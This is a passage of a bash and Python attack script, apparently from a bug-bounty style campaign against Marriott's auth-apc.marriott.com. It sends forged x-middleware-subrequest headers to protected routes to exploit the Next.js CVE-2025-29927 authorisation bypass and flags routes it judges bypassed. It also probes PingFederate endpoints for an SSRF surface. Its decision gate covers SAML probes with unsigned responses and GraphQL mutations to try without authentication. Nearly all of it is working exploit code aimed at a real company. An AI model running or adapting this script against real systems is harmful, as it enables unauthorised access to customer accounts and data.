scope_check "auth-apc.marriott.com" || { echo "SKIP Phase G"; }

# Determine protected routes from Phase C buildManifest
PROTECTED_ROUTES=()
if [ -f "$OUTDIR/routes.txt" ]; then
  mapfile -t PROTECTED_ROUTES < <(grep -oP '^\s+\K/[^/][^\s]+' "$OUTDIR/routes.txt" 2>/dev/null | grep -v "^/\(login\|_error\|404\|500\)$" | head -10 || true)
fi
# Fallback to common Marriott Bonvoy portal routes
if [ ${#PROTECTED_ROUTES[@]} -eq 0 ]; then
  PROTECTED_ROUTES=("/account" "/dashboard" "/profile" "/bookings" "/rewards" "/loyalty" "/home" "/member" "/settings")
fi
echo "G1: Protected route candidates: ${PROTECTED_ROUTES[*]}"

# Middleware path candidates (value for x-middleware-subrequest header)
# From C3 middlewareManifest.js — populate dynamically if found, else use defaults
MW_PATHS=("middleware" "src/middleware" "pages/middleware" "app/middleware")
if [ -f "$OUTDIR/middlewareManifest.js" ] && [ "$(wc -c < $OUTDIR/middlewareManifest.js)" -gt 10 ]; then
  DETECTED=$(python3 -c "
import re
js = open('$OUTDIR/middlewareManifest.js').read()
paths = re.findall(r'[\"\'']([a-z][a-z0-9_/]*middleware[a-z0-9_/]*)[\"\'']', js, re.IGNORECASE)
paths = [p for p in paths if 'node_modules' not in p]
print(' '.join(sorted(set(paths))[:4]))
" 2>/dev/null || echo "")
  if [ -n "$DETECTED" ]; then
    echo "G1: Detected middleware paths from manifest: $DETECTED"
    read -ra MW_PATHS <<< "$DETECTED ${MW_PATHS[*]}"
  fi
fi

echo ""
echo "--- G2: Baseline (no bypass header) ---"
for route in "${PROTECTED_ROUTES[@]:0:4}"; do
  resp=$(curl -s -o "$OUTDIR/g2-baseline$(echo $route | tr '/' '_').html" \
    -w "%{http_code}|%{size_download}|%{redirect_url}" --max-time 15 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    "${BASE_URL_APC}${route}" 2>/dev/null || echo "000|0|")
  code=$(echo "$resp" | cut -d'|' -f1)
  size=$(echo "$resp" | cut -d'|' -f2)
  redir=$(echo "$resp" | cut -d'|' -f3)
  echo "G2 baseline ${route}: ${code}/${size}B redir=${redir}"
  sleep 1
done

echo ""
echo "--- G3: CVE-2025-29927 bypass attempt ---"
for route in "${PROTECTED_ROUTES[@]:0:4}"; do
  for mw in "${MW_PATHS[@]:0:4}"; do
    resp=$(curl -s -o "$OUTDIR/g3-bypass$(echo $route | tr '/' '_')-${mw//\//_}.html" \
      -w "%{http_code}|%{size_download}|%{redirect_url}" --max-time 15 \
      -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
      -H "x-middleware-subrequest: ${mw}" \
      "${BASE_URL_APC}${route}" 2>/dev/null || echo "000|0|")
    code=$(echo "$resp" | cut -d'|' -f1)
    size=$(echo "$resp" | cut -d'|' -f2)
    redir=$(echo "$resp" | cut -d'|' -f3)
    echo "G3 [mw=${mw}] ${route}: ${code}/${size}B redir=${redir}"
    sleep 1
  done
  # v15 variant (5x colon-separated)
  MW5="${MW_PATHS[0]}:${MW_PATHS[0]}:${MW_PATHS[0]}:${MW_PATHS[0]}:${MW_PATHS[0]}"
  resp=$(curl -s -o /dev/null \
    -w "%{http_code}|%{size_download}|%{redirect_url}" --max-time 15 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    -H "x-middleware-subrequest: ${MW5}" \
    "${BASE_URL_APC}${route}" 2>/dev/null || echo "000|0|")
  code=$(echo "$resp" | cut -d'|' -f1)
  size=$(echo "$resp" | cut -d'|' -f2)
  redir=$(echo "$resp" | cut -d'|' -f3)
  echo "G3 [v15-5x] ${route}: ${code}/${size}B redir=${redir}"
  sleep 1
done

echo ""
echo "--- G4: CVE-2025-29927 verdict ---"
python3 - <<'PYEOF'
import os, re, glob

outdir = "/tmp/s19"
baselines = {}
for f in glob.glob(f"{outdir}/g2-baseline*.html"):
    try:
        key = os.path.basename(f).replace("g2-baseline","").replace(".html","")
        content = open(f).read()
        login_redir = bool(re.search(r'href=["\']/?login|/login\?|sign.?in', content, re.IGNORECASE))
        baselines[key] = (len(content), login_redir)
    except:
        pass

print("=== CVE-2025-29927 Analysis ===")
bypassed = []
for f in sorted(glob.glob(f"{outdir}/g3-bypass*.html")):
    try:
        content = open(f).read()
        fname = os.path.basename(f)
        size = len(content)
        has_login_redir = bool(re.search(r'href=["\']/?login|/login\?|sign.?in', content, re.IGNORECASE))
        has_app_content = bool(re.search(r'(?:bookings?|rewards?|loyalty|account|member|profile|dashboard)', content, re.IGNORECASE))
        has_error = bool(re.search(r'(?:401|403|forbidden|unauthorized)', content, re.IGNORECASE))

        if has_app_content and not has_login_redir:
            status = "!!! BYPASS CONFIRMED — app content without auth redirect !!!"
            bypassed.append(fname)
        elif has_login_redir or has_error:
            status = "BLOCKED (auth check still runs)"
        elif size < 200:
            status = "BLOCKED (empty/minimal response)"
        else:
            status = "AMBIGUOUS — check manually"

        print(f"  {fname}: {size}B — {status}")
    except Exception as e:
        print(f"  {f}: error {e}")

print()
if bypassed:
    print(f"CRITICAL: CVE-2025-29927 CONFIRMED — {len(bypassed)} routes bypassed!")
    print("  Next step: reproduce with a clean curl, document HTTP code + response body")
    print("  Report title: Next.js Middleware Authorization Bypass (CVE-2025-29927) on auth-apc.marriott.com")
    print("  Severity: Critical (CVSS 9.1)")
else:
    print("  MITIGATED or NOT VULNERABLE: no bypass detected")
    print("  Possible reasons: patched version (14.2.25+ / 15.2.3+), or auth not in middleware")
PYEOF

echo ""
echo "--- G5: CVE-2023-40148 PingFederate SSRF surface check ---"
for path in \
  "/ext/ref/authenticate" \
  "/ext/ref/openid/authenticate" \
  "/pf/adapter/idp" \
  "/idp/ping.oauth2" \
  "/pf/heartbeat.ping" \
  "/pf-ws/rest/v1/resources"
do
  resp=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 15 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    "${BASE_URL_APC}${path}" 2>/dev/null || echo "000|0")
  code=$(echo "$resp" | cut -d'|' -f1)
  size=$(echo "$resp" | cut -d'|' -f2)
  echo "G5 PF-SSRF ${path}: ${code}/${size}B"
  sleep 1
done
echo "G5: Any 200/302 responses above = PingFederate endpoint reachable → test CVE-2023-40148 manually"

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE F — Decision Gate"
echo "================================================================"

python3 - <<'PYEOF'
import os, re, glob, json

outdir = "/tmp/s19"
print("=== SESSION 19 DECISION GATE ===\n")

# B3: graphql mining
gql_mine = f"{outdir}/graphql-mining.txt"
if os.path.exists(gql_mine):
    content = open(gql_mine).read()
    ops_m = re.search(r'GraphQL Operations \((\d+)\)', content)
    tl_m = re.search(r'gql template literals: (\d+)', content)
    print(f"B3 (graphql-chunk): MINED")
    if ops_m: print(f"   Operations: {ops_m.group(1)}")
    if tl_m:  print(f"   Template literals: {tl_m.group(1)}")
    # High-value signal: mutations = write operations, could bypass auth if not gated
    if "mutation" in content.lower():
        print("   !!! MUTATIONS FOUND — test without auth token")
    if any(x in content for x in ["clientId", "client_id"]):
        print("   !!! CLIENT ID(s) found — may enable OAuth client credential abuse")
else:
    print("B3 (graphql-chunk): NOT MINED")

# D: ACS probe
print()
for label, f in [("D2 empty POST", f"{outdir}/d2-post-body.html"),
                  ("D3 minimal SAMLResponse", f"{outdir}/d3-post-body.html"),
                  ("D4 malformed SAMLResponse", f"{outdir}/d4-post-body.html")]:
    if os.path.exists(f):
        body = open(f).read()
        has_bypass = re.search(r'(?:bookings?|rewards?|dashboard|account|member)', body, re.IGNORECASE)
        has_reject = re.search(r'(?:error|invalid|reject|artifact|signature|400)', body, re.IGNORECASE)
        if has_bypass and not re.search(r'login', body, re.IGNORECASE):
            print(f"D ({label}): !!! CRITICAL BYPASS — app content returned !!!")
        elif has_reject:
            print(f"D ({label}): REJECTED (expected — SP validates properly)")
        else:
            print(f"D ({label}): AMBIGUOUS ({len(body)}B) — review manually")
    else:
        print(f"D ({label}): NOT RUN")

# G: CVE-2025-29927
print()
bypass_files = glob.glob(f"{outdir}/g3-bypass*.html")
confirmed = [f for f in bypass_files if
             re.search(r'(?:bookings?|rewards?|dashboard|account|member)', open(f).read(), re.IGNORECASE)
             and not re.search(r'login|sign.?in', open(f).read(), re.IGNORECASE)]
if confirmed:
    print(f"G (CVE-2025-29927): !!! CRITICAL — {len(confirmed)} routes bypassed !!!")
    for f in confirmed:
        print(f"   {os.path.basename(f)}")
else:
    print(f"G (CVE-2025-29927): No bypass confirmed ({len(bypass_files)} files checked)")

# E: CT enum
ct_hosts = set()
for f in glob.glob(f"{outdir}/crtsh*.json") + glob.glob(f"{outdir}/wayback*.json"):
    try:
        content = open(f).read()
        hosts = re.findall(r'[a-z0-9][a-z0-9-]*(?:\.[a-z0-9-]+)*\.marriott\.com', content.lower())
        ct_hosts.update(h for h in hosts if len(h) > 20)
    except:
        pass
print(f"\nE (CT enum): {len(ct_hosts)} unique hosts discovered")
if ct_hosts:
    for h in sorted(ct_hosts)[:20]:
        print(f"   {h}")

print("\n=== PRIORITIES FOR SESSION 20 ===")
print("1. If CVE-2025-29927 bypasses — PoC + report immediately (Critical)")
print("2. If ACS accepts unsigned SAMLResponse — PoC + chain to account access (Critical/High)")
print("3. If graphql mutations found — probe without auth (potential IDOR/privilege escalation)")
print("4. If CT discovers new hosts — scope-check all → probe any IN-SCOPE")

PYEOF

echo ""
echo "================================================================"
echo "SESSION 19 COMPLETE"
echo "Key output files:"
echo "  $OUTDIR/graphql-mining.txt    — graphql-chunk analysis"
echo "  $OUTDIR/nodeforge-mining.txt  — nodeForge analysis"
echo "  $OUTDIR/routes.txt            — auth-apc pages from buildManifest"
echo "  $OUTDIR/d3-post-body.html     — ACS minimal SAMLResponse response"
echo "  $OUTDIR/d4-post-body.html     — ACS malformed SAMLResponse response"
echo "  $OUTDIR/g3-bypass*.html       — CVE-2025-29927 bypass test responses"
echo "================================================================"
